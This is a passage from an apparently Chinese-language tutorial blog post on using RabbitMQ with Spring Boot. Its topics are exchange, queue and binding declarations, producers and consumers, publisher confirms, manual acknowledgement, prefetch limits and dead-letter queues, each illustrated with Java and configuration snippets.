class=\"keyword\">new</span> DirectExchange(<span class=\"string\">&quot;myDirectExchange&quot;</span>,<span class=\"keyword\">true</span>,<span class=\"keyword\">false</span>);</span><br><span class=\"line\">    Queue message = <span class=\"keyword\">new</span> Queue(<span class=\"string\">&quot;sms&quot;</span>,<span class=\"keyword\">true</span>,<span class=\"keyword\">false</span>,<span class=\"keyword\">false</span>);</span><br><span class=\"line\">    Queue mail = <span class=\"keyword\">new</span> Queue(<span class=\"string\">&quot;mail&quot;</span>, <span class=\"keyword\">true</span>, <span class=\"keyword\">false</span>, <span class=\"keyword\">false</span>);</span><br><span class=\"line\">    Binding binding1 = BindingBuilder.bind(message).to(directExchange).with(<span class=\"string\">&quot;alert.sendsms&quot;</span>);</span><br><span class=\"line\">    Binding binding2 = BindingBuilder.bind(mail).to(directExchange).with(<span class=\"string\">&quot;alert.sendmaili&quot;</span>);</span><br><span class=\"line\">    amqpAdmin.declareExchange(directExchange);</span><br><span class=\"line\">    amqpAdmin.declareQueue(message);</span><br><span class=\"line\">    amqpAdmin.declareQueue(mail);</span><br><span class=\"line\">    amqpAdmin.declareBinding(binding1);</span><br><span class=\"line\">    amqpAdmin.declareBinding(binding2);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//通过Autowired注解在生成该类的bean时自动执行该方法，该方法使用注入的amqpAdmin生成绑定</span></span><br></pre></td></tr></table></figure>\n\n<p>方法二：把组件加入到Spring容器中,让AmqpAdmin自动帮我们配置</p>\n<p>RabbitAdmin类实现了AmqpAdmin接口的同时还实现了ApplicationContextAware接口使得他可以获取到spring容器中的bean，同时还实现了InitializingBean接口，该接口只有afterPropertiesSet()一个方法，该方法使用applicationContext获取exchange,queue以及bingding并设置绑定。<strong>真正帮我们声明的类还时RabbitAdmin</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Bean</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> DirectExchange <span class=\"title\">myExchange</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> DirectExchange(<span class=\"string\">&quot;exchange_fanout&quot;</span>,<span class=\"keyword\">true</span>,<span class=\"keyword\">false</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Bean</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> Queue <span class=\"title\">sms</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> Queue(<span class=\"string\">&quot;sms&quot;</span>,<span class=\"keyword\">true</span>,<span class=\"keyword\">false</span>,<span class=\"keyword\">false</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">@Bean</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> Queue <span class=\"title\">mail</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> Queue(<span class=\"string\">&quot;mail&quot;</span>,<span class=\"keyword\">true</span>,<span class=\"keyword\">false</span>,<span class=\"keyword\">false</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">@Bean</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> Binding <span class=\"title\">smsBinding</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> BindingBuilder.bind(sms()).to(myExchange()).with(<span class=\"string\">&quot;alert.sms&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">@Bean</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> Binding <span class=\"title\">mailBinding</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> BindingBuilder.bind(mail()).to(myExchange()).with(<span class=\"string\">&quot;alert.sendmail&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<blockquote>\n<p>总结-&gt;exchange,queue,binding之间关系设置1.rabbitAdmin设置关系3.直接注入容器设置关系</p>\n</blockquote>\n<h3 id=\"生产者\"><a href=\"#生产者\" class=\"headerlink\" title=\"生产者\"></a>生产者</h3><ol>\n<li>生产者：通过自动注入RabbitTemplate，在生产者发送消息。其中最常用的方法是send和convertAndSend方法它们的区别是send方法需要自己创建message对象，如果不需要多余参数，使用convertAndSend会更好，它会帮我们将传进去的消息封装成Message对象，结果是一样的。一共4种转换json，两种byte流，xml。默认消息转化类是<code>SimpleMessageConverter</code>，创建消息时会根据对象类型生成。</li>\n</ol>\n<ul>\n<li>byte[]类型不变</li>\n<li>string类型转化为byte[]</li>\n<li>可序列化对象则转化为byte[]</li>\n</ul>\n<p>最终都是转化为byte[]</p>\n<p>最终发送还是通过<code>channel.basicPublish</code>发送</p>\n<blockquote>\n<p>总结-&gt;生产者通过send或convertAndSend发送消息</p>\n</blockquote>\n<h3 id=\"消费者\"><a href=\"#消费者\" class=\"headerlink\" title=\"消费者\"></a>消费者</h3><ol start=\"2\">\n<li>消费者：编写组件消费者添加注解<code>@RabbitListener(queuesToDeclare = @Queue(value = &quot;msg1&quot;,declare = &quot;false&quot;,autoDelete = &quot;false&quot;,exclusive = &quot;false&quot;))</code>在消费者类上，在消费方法(名称随意)上添加<code>@RabbitHandler</code>。<code>@RabbitListener</code>注解也可以直接加在方法上，那样就不用加<code>@RabbitHandler</code>了</li>\n</ol>\n<h4 id=\"方法1\"><a href=\"#方法1\" class=\"headerlink\" title=\"方法1\"></a>方法1</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Bean</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> SimpleMessageListenerContainer <span class=\"title\">simpleMessageListenerContainer</span><span class=\"params\">(ConnectionFactory connectionFactory)</span></span>&#123;</span><br><span class=\"line\">   SimpleMessageListenerContainer smlc = <span class=\"keyword\">new</span> SimpleMessageListenerContainer(connectionFactory);</span><br><span class=\"line\">   <span class=\"comment\">//监听一个或者多个队列</span></span><br><span class=\"line\">   smlc.setQueueNames(<span class=\"string\">&quot;worker&quot;</span>,<span class=\"string\">&quot;msg1&quot;</span>);</span><br><span class=\"line\">   <span class=\"comment\">//设置多少个消费者线程来消费这些队列</span></span><br><span class=\"line\">   smlc.setConcurrentConsumers(<span class=\"number\">3</span>);</span><br><span class=\"line\">   <span class=\"comment\">//设置最大多少个消费者来消费这些队列</span></span><br><span class=\"line\">   smlc.setMaxConcurrentConsumers(<span class=\"number\">5</span>);</span><br><span class=\"line\">   <span class=\"comment\">//设置消费者的确认方式</span></span><br><span class=\"line\">   smlc.setAcknowledgeMode(AcknowledgeMode.MANUAL);</span><br><span class=\"line\">   <span class=\"comment\">//设置消费端限流机制,最多运行5条消息没有确认.如果正在确认5条消息,则无法消费更多的消息,直到确认了。</span></span><br><span class=\"line\">   smlc.setPrefetchCount(<span class=\"number\">5</span>);</span><br><span class=\"line\">   <span class=\"comment\">//设置消息处理</span></span><br><span class=\"line\">   smlc.setMessageListener((ChannelAwareMessageListener)(message, channel)-&gt;&#123;</span><br><span class=\"line\">      System.out.println(<span class=\"string\">&quot;消费的队列为: &quot;</span>+message.getMessageProperties().getConsumerQueue());</span><br><span class=\"line\">      System.out.println(<span class=\"string\">&quot;获取到的消息为: &quot;</span>+<span class=\"keyword\">new</span> String(message.getBody()));</span><br><span class=\"line\">      System.out.println(<span class=\"string\">&quot;属性为: &quot;</span>+message.getMessageProperties());</span><br><span class=\"line\">      channel.basicAck(message.getMessageProperties().getDeliveryTag(),<span class=\"keyword\">false</span>);</span><br><span class=\"line\">   &#125;);</span><br><span class=\"line\">   <span class=\"keyword\">return</span> smlc;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>配置信息写在代码中就不灵活了，因此可以在springboot的配置文件中配置信息，然后再注入这个SimpleMessageListenerContainer</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">spring:</span></span><br><span class=\"line\">  <span class=\"attr\">rabbitmq:</span></span><br><span class=\"line\">    <span class=\"attr\">listener:</span></span><br><span class=\"line\">      <span class=\"attr\">simple:</span></span><br><span class=\"line\">        <span class=\"attr\">max-concurrency:</span> <span class=\"number\">50</span></span><br><span class=\"line\">        <span class=\"attr\">concurrency:</span> <span class=\"number\">13</span></span><br><span class=\"line\">        <span class=\"attr\">acknowledge-mode:</span> <span class=\"string\">manual</span></span><br><span class=\"line\">        <span class=\"attr\">prefetch:</span> <span class=\"number\">5</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Bean</span></span><br><span class=\"line\"><span class=\"meta\">@ConfigurationProperties(prefix = &quot;spring.rabbitmq.listener.simple&quot;)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> SimpleMessageListenerContainer <span class=\"title\">simpleMessageListenerContainer</span><span class=\"params\">(ConnectionFactory connectionFactory)</span></span>&#123;</span><br><span class=\"line\">\tSimpleMessageListenerContainer smlc = <span class=\"keyword\">new</span> SimpleMessageListenerContainer(connectionFactory);</span><br><span class=\"line\">\tsmlc.setQueueNames(<span class=\"string\">&quot;worker&quot;</span>,<span class=\"string\">&quot;msg1&quot;</span>);</span><br><span class=\"line\">\t<span class=\"comment\">//消息处理</span></span><br><span class=\"line\">\tsmlc.setMessageListener((ChannelAwareMessageListener)(message, channel)-&gt;&#123;</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">&quot;消费的队列为: &quot;</span>+message.getMessageProperties().getConsumerQueue());</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">&quot;获取到的消息为: &quot;</span>+<span class=\"keyword\">new</span> String(message.getBody()));</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">&quot;属性为: &quot;</span>+message.getMessageProperties());</span><br><span class=\"line\">\t\tchannel.basicAck(message.getMessageProperties().getDeliveryTag(),<span class=\"keyword\">false</span>);</span><br><span class=\"line\">\t&#125;);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> smlc;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<p>第二种方法</p>\n<p>使用注解生成，配置类跟第一种方法一样，只是处理方法分开出来到单独的类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Component</span></span><br><span class=\"line\"><span class=\"meta\">@RabbitListener(queues = &quot;jinjinQueue&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">QueueConsumer</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@RabbitHandler</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">reviceMessage</span><span class=\"params\">(<span class=\"meta\">@Payload</span> Message message,Channel channel,<span class=\"keyword\">byte</span>[] msg)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        \tSystem.out.println(<span class=\"string\">&quot;rabbitMQ已经接收到信息: &quot;</span> + msg);</span><br><span class=\"line\">            channel.basicAck(message.getMessageProperties().getDeliveryTag(),<span class=\"keyword\">false</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">//如果出现异常，不重发到队列中，可以转到死信队列</span></span><br><span class=\"line\">                channel.basicNack(message.getMessageProperties().getDeliveryTag(),<span class=\"keyword\">false</span>,<span class=\"keyword\">false</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (IOException ioException) &#123;</span><br><span class=\"line\">                ioException.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>也可以直接把@RabbitListener注解加到监听方法上，那么生成默认的队列是持久化，不自动删除，非独占的</p>\n<p>@Queue注解生成的队列是暂时的，断开连接后则会被销毁。建议还是使用自己创建的队列更易于管理。</p>\n<p>如下</p>\n<p>其他模式代码实例</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//work queue</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">WorkConsumer</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"meta\">@RabbitListener(queuesToDeclare = @Queue(value = &quot;worker&quot;))</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onReceive</span><span class=\"params\">(String message)</span></span>&#123;</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">&quot;message1 = &quot;</span>+message);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"meta\">@RabbitListener(queuesToDeclare = @Queue(value = &quot;worker&quot;))</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onReceive2</span><span class=\"params\">(String message)</span></span>&#123;</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">&quot;message2 = &quot;</span>+message);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//fanout</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FanoutConsumer</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"meta\">@RabbitListener(</span></span><br><span class=\"line\"><span class=\"meta\">\t\t\tbindings = @QueueBinding(value = @Queue,</span></span><br><span class=\"line\"><span class=\"meta\">\t\t\t\t\texchange = @Exchange(value = &quot;logs&quot;,type = &quot;fanout&quot;)</span></span><br><span class=\"line\"><span class=\"meta\">\t\t\t)</span></span><br><span class=\"line\"><span class=\"meta\">\t)</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">receive</span><span class=\"params\">(String message)</span></span>&#123;</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">&quot;message: &quot;</span>+message);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"meta\">@RabbitListener(</span></span><br><span class=\"line\"><span class=\"meta\">\t\t\tbindings = @QueueBinding(value = @Queue,</span></span><br><span class=\"line\"><span class=\"meta\">\t\t\t\t\texchange = @Exchange(value = &quot;logs&quot;,type = &quot;fanout&quot;)</span></span><br><span class=\"line\"><span class=\"meta\">\t\t\t)</span></span><br><span class=\"line\"><span class=\"meta\">\t)</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">receive2</span><span class=\"params\">(String message)</span></span>&#123;</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">&quot;message: &quot;</span>+message);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//direct</span></span><br><span class=\"line\"><span class=\"meta\">@RabbitListener(</span></span><br><span class=\"line\"><span class=\"meta\">    bindings = @QueueBinding(value = @Queue,</span></span><br><span class=\"line\"><span class=\"meta\">                             exchange = @Exchange(value = &quot;ex_direct&quot;,type = &quot;direct&quot;),</span></span><br><span class=\"line\"><span class=\"meta\">                             key = &#123;&quot;error&quot;,&quot;info&quot;&#125;</span></span><br><span class=\"line\"><span class=\"meta\">                            )</span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">receive</span><span class=\"params\">(String message)</span></span>&#123;</span><br><span class=\"line\">    System.out.println(<span class=\"string\">&quot;message: &quot;</span>+message+<span class=\"string\">&quot;,method1:error info&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@RabbitListener(</span></span><br><span class=\"line\"><span class=\"meta\">    bindings = @QueueBinding(value = @Queue,</span></span><br><span class=\"line\"><span class=\"meta\">                             exchange = @Exchange(value = &quot;ex_direct&quot;,type = &quot;direct&quot;),</span></span><br><span class=\"line\"><span class=\"meta\">                             key = &#123;&quot;warning&quot;,&quot;info&quot;&#125;</span></span><br><span class=\"line\"><span class=\"meta\">                            )</span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">receive2</span><span class=\"params\">(String message)</span></span>&#123;</span><br><span class=\"line\">    System.out.println(<span class=\"string\">&quot;message: &quot;</span>+message+<span class=\"string\">&quot;,method2:warning info&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@RabbitListener(</span></span><br><span class=\"line\"><span class=\"meta\">    bindings = @QueueBinding(value = @Queue,</span></span><br><span class=\"line\"><span class=\"meta\">                             exchange = @Exchange(value = &quot;ex_direct&quot;,type = &quot;direct&quot;),</span></span><br><span class=\"line\"><span class=\"meta\">                             key = &#123;&quot;error&quot;,&quot;warning&quot;&#125;</span></span><br><span class=\"line\"><span class=\"meta\">                            )</span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">receive3</span><span class=\"params\">(String message)</span></span>&#123;</span><br><span class=\"line\">    System.out.println(<span class=\"string\">&quot;message: &quot;</span>+message+<span class=\"string\">&quot;,method3:error warning&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//动态路由同上，只是修改type以及key改成*与#</span></span><br></pre></td></tr></table></figure>\n\n\n\n<blockquote>\n<p>总结-&gt;</p>\n<p>1.使用AbstractMessageListenerContainer的子类(共3个)使用SimpleMessageListenerContainer够了</p>\n<p>2.使用注解标注回调处理消息的方法</p>\n</blockquote>\n<h2 id=\"高级特性\"><a href=\"#高级特性\" class=\"headerlink\" title=\"高级特性\"></a>高级特性</h2><h3 id=\"持久化\"><a href=\"#持久化\" class=\"headerlink\" title=\"持久化\"></a>持久化</h3><p>springboot中消息，队列，交换机都是默认持久化的，如果需要改变：</p>\n<p>1、使用send方法，发送message。设置message中MessageProperties的属性deliveryMode</p>\n<p>2、自定义MessageConverter，在消息转换时，设置MessageProperties的属性deliveryMode</p>\n<p>3、自定MessagePropertiesConverter，在MessageProperties对象转换成BasicProperties时，设置deliveryMode</p>\n<h3 id=\"发送端确认机制\"><a href=\"#发送端确认机制\" class=\"headerlink\" title=\"发送端确认机制\"></a>发送端确认机制</h3><blockquote>\n<p>一旦消息发送到RabbitMQ服务器中，就会触发这个机制。队列持久化+消息持久化+发送确认保证消息不丢失(可靠性)</p>\n<p>避免了因为交换机出错导致消息丢失</p>\n</blockquote>\n<p>配置中开启</p>\n<figure class=\"highlight properties\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">spring.rabbitmq.publisher-confirm-type</span>=<span class=\"string\">correlated</span></span><br></pre></td></tr></table></figure>\n\n<p>代码中增强</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Autowired</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> RabbitTemplate <span class=\"title\">enhanceRabbitTemplate</span><span class=\"params\">(RabbitTemplate rabbitTemplate)</span></span>&#123;</span><br><span class=\"line\">   rabbitTemplate.setConfirmCallback((correlationData,ack,cause)-&gt;&#123;</span><br><span class=\"line\">      System.out.println(<span class=\"string\">&quot;correlationData: &quot;</span>+correlationData);</span><br><span class=\"line\">      System.out.println(<span class=\"string\">&quot;ack: &quot;</span>+ack);</span><br><span class=\"line\">      System.out.println(<span class=\"string\">&quot;cause: &quot;</span>+cause);</span><br><span class=\"line\">      System.out.println(<span class=\"string\">&quot;服务端返回确认标志&quot;</span>);</span><br><span class=\"line\">\t  <span class=\"comment\">//其他业务代码</span></span><br><span class=\"line\">   &#125;);</span><br><span class=\"line\">   <span class=\"keyword\">return</span> rabbitTemplate;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">或者</span><br><span class=\"line\"><span class=\"meta\">@Autowired</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">enhanceRabbitTemplate</span><span class=\"params\">(RabbitTemplate rabbitTemplate)</span></span>&#123;</span><br><span class=\"line\">   rabbitTemplate.setConfirmCallback((correlationData,ack,cause)-&gt;&#123;</span><br><span class=\"line\">      System.out.println(<span class=\"string\">&quot;correlationData: &quot;</span>+correlationData);</span><br><span class=\"line\">      System.out.println(<span class=\"string\">&quot;ack: &quot;</span>+ack);</span><br><span class=\"line\">      System.out.println(<span class=\"string\">&quot;cause: &quot;</span>+cause);</span><br><span class=\"line\">      System.out.println(<span class=\"string\">&quot;服务端返回确认标志&quot;</span>);</span><br><span class=\"line\">      <span class=\"comment\">//其他业务代码</span></span><br><span class=\"line\"></span><br><span class=\"line\">   &#125;);</span><br><span class=\"line\">&#125;    </span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"消息返回机制\"><a href=\"#消息返回机制\" class=\"headerlink\" title=\"消息返回机制\"></a>消息返回机制</h3><blockquote>\n<p>当RabbitTemplate发送消息到RabbitMQ服务器中后，如果找到交换机，但是找不到队列，就会触发消息返回机制。避免了队列出现问题</p>\n</blockquote>\n<p>配置中开启</p>\n<figure class=\"highlight properties\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">spring.rabbitmq.publisher-returns</span>=<span class=\"string\">true</span></span><br></pre></td></tr></table></figure>\n\n<p>代码中增强</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">rabbitTemplate.setReturnCallback((message,b,c,d,e)-&gt;&#123;</span><br><span class=\"line\">\t\t\tlog.info(<span class=\"keyword\">new</span> String(message.getBody()));</span><br><span class=\"line\">\t\t\tlog.info(b+<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">\t\t\tlog.info(c);</span><br><span class=\"line\">\t\t\tlog.info(d);</span><br><span class=\"line\">\t\t\tlog.info(e);</span><br><span class=\"line\">    <span class=\"comment\">//业务逻辑</span></span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"消费端确认机制\"><a href=\"#消费端确认机制\" class=\"headerlink\" title=\"消费端确认机制\"></a>消费端确认机制</h3><p>先将自动确认改为手动确认</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//1.配置文件修改</span></span><br><span class=\"line\"><span class=\"comment\">//spring.rabbitmq.listener.simple.acknowledge-mode=manual</span></span><br><span class=\"line\"><span class=\"comment\">//2.container修改</span></span><br><span class=\"line\">simpleMessageListenerContainer.setAcknowledgeMode(AcknowledgeMode.MANUAL);</span><br><span class=\"line\"><span class=\"comment\">//3.factory修改</span></span><br><span class=\"line\">factory.setAcknowledgeMode(AcknowledgeMode.MANUAL);</span><br></pre></td></tr></table></figure>\n\n<p><strong>开启手动确认后，消费端需要手动确认，在手动确认之前，消息将会是Unacked状态，在项目重新启动或RabbitMQ服务器重启后，消息将会变成Ready的状态。</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//确认方法 参数1：根据Tag设置确认   参数2：是否批量确认</span></span><br><span class=\"line\">channel.basicAck(message.getMessageProperties().getDeliveryTag(),<span class=\"keyword\">false</span>);</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"消费端限流机制\"><a href=\"#消费端限流机制\" class=\"headerlink\" title=\"消费端限流机制\"></a>消费端限流机制</h3><p>队列每次取几条消息，如果队列的Unacked值大于设定值，则消息暂存队列中，等待消费者消费完消息确认后再消费下一条消息</p>\n<p>需要配合消费端确认机制一起使用，开启消费端手动确认</p>\n<p>开启方式</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//1.配置文件修改</span></span><br><span class=\"line\">spring.rabbitmq.listener.simple.prefetch=<span class=\"number\">5</span></span><br><span class=\"line\"><span class=\"comment\">//2.container修改</span></span><br><span class=\"line\">simpleMessageListenerContainer.setPrefetchCount(<span class=\"number\">5</span>);</span><br><span class=\"line\"><span class=\"comment\">//3.factory修改</span></span><br><span class=\"line\">factory.setPrefetch(<span class=\"number\">5</span>)</span><br><span class=\"line\"><span class=\"comment\">//与确认机制一模一样</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"死信队列使用\"><a href=\"#死信队列使用\" class=\"headerlink\" title=\"死信队列使用\"></a>死信队列使用</h3><p>死信产生原因:</p>\n<ol>\n<li>消息超时未被处理，只需在生成队列吧一个Map加到构造函数上，<code>map.put(&quot;x-max-length&quot;,10)</code></li>\n<li>消息队列超过最大长度，只需在生成队列吧一个Map加到构造函数上,<code>map.put(&quot;x-message-ttl&quot;,10000)</code>,单位为毫秒</li>\n<li>消息被拒绝<code>basicReject(tag,requeue)</code>,requeue表示是否放回到队列中，一般建议为false。</li>\n</ol>\n<p>可以为队列或者某一个消息设置过期时间，如果队列中的消息过期了还未被处理，则消息会被丢弃，造成数据丢失，因此通常配合死信队列一起使用。在创建队列的时候配置过期时间、</p>\n<ol>\n<li><strong>创建死信队列与交换机</strong></li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Configuration</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">DeadConfig</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//1.创建direct交换机</span></span><br><span class=\"line\">    <span class=\"meta\">@Bean</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> DirectExchange <span class=\"title\">DeadDirectExchange</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> DirectExchange(<span class=\"string\">&quot;Dead_direct_exchange&quot;</span>,<span class=\"keyword\">true</span>,<span class=\"keyword\">false</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//2.创建死信队列</span></span><br><span class=\"line\">    <span class=\"meta\">@Bean</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Queue <span class=\"title\">DeadDirectQueue</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//通过参数的形式设置到队列中即可</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> Queue(<span class=\"string\">&quot;DeadDirectQueue&quot;</span>,<span class=\"keyword\">true</span>,<span class=\"keyword\">false</span>,<span class=\"keyword\">false</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//3.将队列绑定到交换机上,绑定一个死信路由</span></span><br><span class=\"line\">    <span class=\"meta\">@Bean</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Binding <span class=\"title\">DeadDirectBinding1</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> BindingBuilder.bind(DeadDirectQueue()).to(DeadDirectExchange()).with(<span class=\"string\">&quot;dead&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><strong>将正常队列设置上死信队列的交换机以及路由key即可</strong></li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Configuration</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TTLConfig</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//1.创建direct交换机</span></span><br><span class=\"line\">    <span class=\"meta\">@Bean</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> DirectExchange <span class=\"title\">normalExchange</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> DirectExchange(<span class=\"string\">&quot;ttl_direct_exchange&quot;</span>,<span class=\"keyword\">true</span>,<span class=\"keyword\">false</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//2.创建队列</span></span><br><span class=\"line\"> 